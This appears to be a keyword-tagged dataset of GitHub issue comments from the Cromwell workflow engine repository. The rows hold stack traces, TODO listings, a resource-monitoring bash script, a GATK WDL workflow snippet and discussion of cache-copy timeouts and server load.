kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfu,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:4487,concurren,concurrent,4487,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['concurren'],['concurrent']
Performance, scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); akka.dispatch.forkjoin.ForkJoinW,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:100209,concurren,concurrent,100209,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
Performance," sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b76aed8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueu",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:3377,concurren,concurrent,3377,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance," the WMA; ./engine/src/test/scala/cromwell/engine/workflow/MaterializeWorkflowDescriptorActorSpec.scala: // TODO PBE: this should be done by MWDA (ticket #1076); ./engine/src/test/scala/cromwell/engine/workflow/MaterializeWorkflowDescriptorActorSpec.scala: // TODO: PBE: Re-enable (ticket #1063); ./engine/src/test/scala/cromwell/engine/WorkflowManagerActorSpec.scala: // TODO PBE: Restart workflows tests: re-add (but somewhere else?) in 0.21; ./project/Settings.scala: //""-deprecation"", // TODO: PBE: Re-enable deprecation warnings; ./services/src/main/scala/cromwell/services/metadata/MetadataService.scala: /* TODO: PBE: No MetadataServiceActor.props until circular dependencies fixed.; ./supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActor.scala: // TODO: PBE: Trace callers of ""new CallContext()"". Seems to be multiple places in JES, etc. For now:; ./supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActor.scala: // TODO: PBE: The REST endpoint toggles this value... how/where? Meanwhile, we read it decide to use the cache...; ./supportedBackends/jes/src/test/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActorSpec.scala: // TODO: PBE: This spec may run faster by going back to mocks? Also, building the actor ref is copy/pasted a lot; ./supportedBackends/sfs/src/main/scala/cromwell/backend/sfs/SharedFileSystemAsyncJobExecutionActor.scala: // TODO: PBE: The REST endpoint toggles this value... how/where? Meanwhile, we read it decide to use the cache...; ./supportedBackends/sfs/src/test/scala/cromwell/backend/sfs/SharedFileSystemJobExecutionActorSpec.scala: // TODO: PBE: This test needs work. If the abort fires to quickly, it causes a race condition in waitAndPostProcess.; ./supportedBackends/sfs/src/test/scala/cromwell/backend/sfs/SharedFileSystemJobExecutionActorSpec.scala: // TODO: PBE: abort doesn't actually seem to abort. It runs the full 10 seconsds, then returns the response.`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1221#issuecomment-240175479:2185,cache,cache,2185,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1221#issuecomment-240175479,3,"['cache', 'race condition']","['cache', 'race condition']"
Performance," the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadinstitute/cromwell/issues/5977>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ; > .; >; > —; > You are receiving this because you commented.; >; >; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EJEL23DXZQ4G3JVNQ3SPJKNNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:2639,cache,cacheCopy,2639,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['cache'],['cacheCopy']
Performance," to know if it's technically feasible, but I think it would be ideal as an always-on stats provider. There are two main reasons why:; 1) Linux memory usage is complex enough that it's easy to get this wrong. I started with the script provided above, but on many systems it gives the wrong answer because linux aggressively caches things in memory, and you therefore ""used"" - ""buffers"" - ""cached"" is a much better approximation of the memory that's tied up. Here's a plot showing these two estimates vs output from docker stats:; ![image](https://user-images.githubusercontent.com/6463752/48026456-228c0f80-e114-11e8-9240-e5e7b1c3cb23.png). 2) Seemingly every new linux distro changes the output format and calculations of free and df. The number of rows and columns change, requiring complex gymnastics with awk to extract the required values and do the math. And some docker images don't come with free or df at all. This is a problem for me because I'm optimizing WDLs but it's not always easy to change the dockers they're running in (I'm guessing I'm not totally unique in this). Difficulties like this led me to develop a variant of the script that uses /proc for cpu and memory info. I've inlined it below:; ```; #!/bin/bash; set -Eeuo pipefail. MONITOR_MOUNT_POINT=${MONITOR_MOUNT_POINT:-""/cromwell_root""}; SLEEP_TIME=${SLEEP_TIME:-""10""}. function getCpuUsage() {; # get cpu info just by grep-ing from /proc/stat. Use awk to convert to %; grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {printf ""%.1f%%"", usage}'; }. function getMem() {; # get desired memory value from /proc/meminfo, in GiB, and also; # as a percentage of total; # argument is the label of the desired memory value; cat /proc/meminfo \; | awk -v MEM_FIELD=""$1"" '{; f[substr($1, 1, length($1)-1)] = $2; } END {; printf ""%.2f GiB"", f[MEM_FIELD] / 1048576; }' ; }. function getMemUnavailable() {; # get unavailable memory from /proc/meminfo, in GiB; cat /proc/meminfo \; | awk '{; f[substr($1, 1, length($1)-1)]",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2507#issuecomment-436035027:1105,optimiz,optimizing,1105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2507#issuecomment-436035027,1,['optimiz'],['optimizing']
Performance,"![load_avg_with_and_without_sync](https://cloud.githubusercontent.com/assets/817809/23653377/0b318f3e-0378-11e7-9b24-a2cbe2b3e2dd.png). This is a plot of load average on our machine that hosts cromwell running as server - the box has 48 cores and 256G RAM. Mounted filesystems are local disk, an NFS share, and Lustre filesystem that hosts cromwell executions directory. The chart covers two identical submissions of a batch of about 1500 workflows. The period on the left from 5:45 to 7:30 with load (gray area) peaking up around 800 is running with release 25 jar. The period on the right from 9:15 to 10:30 is running with a build that is identical to release 25 but without [this sync](https://github.com/broadinstitute/cromwell/blob/fac784dd4078b8cc12fb4ca6c9abdbb05072990b/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L192).; It's a big difference, and very noticeable in the responsiveness of the server at the two different times.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-284691016:154,load,load,154,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-284691016,2,['load'],['load']
Performance,"""Fixed performance""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5112#issuecomment-520597918:7,perform,performance,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5112#issuecomment-520597918,1,['perform'],['performance']
Performance,"#### Comment 1. Could you add a key to indicate what the various colors and line-types mean?. #### Comment 2. All of the actors are ultimately descended from the CromwellRootActor (or should be, except the server or cmdline actors which create it) - I don't see that shown for the call cache actors group. Is that genuinely true (scary!), or do they need a line of ancestry coming in from somewhere?. #### Comment 3 ; (this one is more TOL-y...). Is there an even higher level ""10,000 foot"" view with functional units shown linked together? Eg you've drawn some of the boxes in different colors, presumably those would be reasonable candidates for boxes on some higher-level view?. The reason I ask is, (a) this diagram is scarier than I realized! It'd be nice to have some higher-level context before seeing the whole thing in full... or (b) I had to zoom in really far in order to make out the words in the individual boxes - I wonder if one context-setting diagram would then let us have (say) 5 different 5,000 foot magnifications for individual subsystems, rather than a single all-in-one diagram? (although EDIT... that said, I do find the big-picture diagram kind of awesome, maybe we could get it printed out on giant paper somewhere... 🤔)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5264#issuecomment-551243707:286,cache,cache,286,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5264#issuecomment-551243707,1,['cache'],['cache']
Performance,#4598 is related (not great performance in JMUI use cases) but not the same.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4561#issuecomment-459040378:28,perform,performance,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4561#issuecomment-459040378,1,['perform'],['performance']
Performance,$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.mutable.ResizableArray$class.foreach(ResizableArray.scala:59) ~[cromwell.jar:0.19]; at scala.collection.mutable.ArrayBuffer.foreach(ArrayBuffer.scala:48) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$class.cromwell$engine$backend$Backend$$hashGivenDockerHash(Backend.scala:193) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at scala.util.Success.map(Try.scala:237) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[cromwell.jar:0.19]; at akk,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:4311,concurren,concurrent,4311,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['concurren'],['concurrent']
Performance,$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(CromwellTestKitSpec.scala:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAtte,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:4695,concurren,concurrent,4695,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,2,['concurren'],['concurrent']
Performance,"$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: isEmpty was false, and Some(false) did not contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp); at org.scalatest.Assertions.newAssertionFailedException(Assertions.scala:528); at org.scalatest.Assertions.newAssertionFailedException$(Assertions.scala:527); at cromwell.core.TestKitSuite.newAssertionFailedException(TestKitSuite.scala:16); at org.scalatest.Assertions$AssertionsHelper.macroAssert(Assertions.scala:501); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$5",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:5421,concurren,concurrent,5421,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,1,['concurren'],['concurrent']
Performance,"${mem}g -jar ${gatk_jar} AnnotateTargets --targets ${target_file} --reference ${ref_fasta} --output ${entity_id}.annotated.tsv; \; else touch ${entity_id}.annotated.tsv; \; fi; }. output {; File annotated_targets = ""${entity_id}.annotated.tsv""; }; }. # Correct coverage for sample-specific GC bias effects; # Note that this task is optional ; task CorrectGCBias {; String entity_id; File coverage_file; File annotated_targets; String gatk_jar; Boolean enable_gc_correction; Int mem. # If GC correction is disabled, then the coverage file gets passed downstream unchanged; command {; if [ ${enable_gc_correction} = true ]; \; then java -Xmx${mem}g -jar ${gatk_jar} CorrectGCBias --input ${coverage_file} \; --output ${entity_id}.gc_corrected_coverage.tsv --targets ${annotated_targets}; \; else cp ${coverage_file} ${entity_id}.gc_corrected_coverage.tsv; \; fi; }. output {; File gatk_cnv_coverage_file_gcbias = ""${entity_id}.gc_corrected_coverage.tsv""; }; }. # Perform tangent normalization (noise reduction) on the proportional coverage file.; task NormalizeSomaticReadCounts {; String entity_id; File coverage_file; File padded_target_file; File pon; String gatk_jar; Int mem. command {; java -Xmx${mem}g -jar ${gatk_jar} NormalizeSomaticReadCounts --input ${coverage_file} \; --targets ${padded_target_file} --panelOfNormals ${pon} --factorNormalizedOutput ${entity_id}.fnt.tsv --tangentNormalized ${entity_id}.tn.tsv \; --betaHatsOutput ${entity_id}.betaHats.tsv --preTangentNormalized ${entity_id}.preTN.tsv --help false --version false --verbosity INFO --QUIET false; }. output {; File tn_file = ""${entity_id}.tn.tsv""; File pre_tn_file = ""${entity_id}.preTN.tsv""; File betahats_file = ""${entity_id}.betaHats.tsv""; }; #runtime {; # docker: ""gatk-protected/a1""; #}; }. # Segment the tangent normalized coverage profile.; task PerformSegmentation {; String entity_id; Float seg_param_alpha; Int seg_param_nperm; String seg_param_pmethod; Int seg_param_minWidth; Int seg_param_kmax; Int seg_param_nm",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1488#issuecomment-249696151:13381,Perform,Perform,13381,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1488#issuecomment-249696151,1,['Perform'],['Perform']
Performance,(MapLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.ja,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618:5321,concurren,concurrent,5321,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618,1,['concurren'],['concurrent']
Performance,(SqlJobStore.scala:66) ~[classes/:na]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.util.Try$.apply(Try.scala:192) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.util.Success.map(Try.scala:237) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[scala-library-2.11.7.jar:na]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[scala-library-2.11.7.jar:na]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32) ~[scala-library-2.11.7.jar:na]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72) ~[scala-library-2.11.7.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [akka-actor_2.11-2.3.15.jar:na]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [scala-library-2.11.7.jar:na]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [scala-library-2.11.7.jar:na]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [scala-library-2.11.7.jar:na]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [scala-library-2.11.7.jar:na]; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1349#issuecomment-242840472:3274,concurren,concurrent,3274,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1349#issuecomment-242840472,5,['concurren'],['concurrent']
